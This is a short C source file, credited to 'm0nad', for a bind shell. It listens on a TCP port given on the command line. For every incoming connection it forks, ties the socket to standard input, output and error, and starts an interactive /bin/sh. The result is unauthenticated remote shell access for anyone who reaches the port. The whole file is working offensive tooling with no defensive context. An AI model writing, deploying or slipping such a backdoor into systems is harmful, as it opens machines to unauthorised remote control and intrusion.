/*
Simple bindshell by m0nad
*/
#include <stdio.h>
#include <stdlib.h>
//#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
void error(char * msg)
{
    perror(msg);
    exit(1);
}

int
init_serv(struct sockaddr_in * name, unsigned short int port)
{
  int fd;
  //memset ((char *) name,0, sizeof (*name));
  name->sin_family = AF_INET;
  name->sin_port = htons(port);
  name->sin_addr.s_addr = htonl(INADDR_ANY);

  if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    error("SOCKET");
  if (bind (fd, (struct sockaddr *)name, sizeof(struct sockaddr)) < 0)
    error("BIND");
  if (listen (fd, SOMAXCONN) < 0)
    error("LISTEN");

  return fd;
} 
int
main (int argc, char ** argv) 
{
  int sockfd, port, conex; 
  char * const sh[] = { "/bin/sh", "-i", NULL };
  struct sockaddr_in server;
  if (argc < 2) {
    printf("%s port\n",argv[0]);
    exit(1);
  }

  port = atoi(argv[1]); 
  sockfd = init_serv(&server, port);  
 
  while ((conex = accept(sockfd, NULL, NULL)) > 0) {
    if (!fork ()) {
      dup2(conex, 0); dup2(conex, 1); dup2(conex, 2);
      execve(*sh, sh, NULL);
    }
  }

  return 0;
}

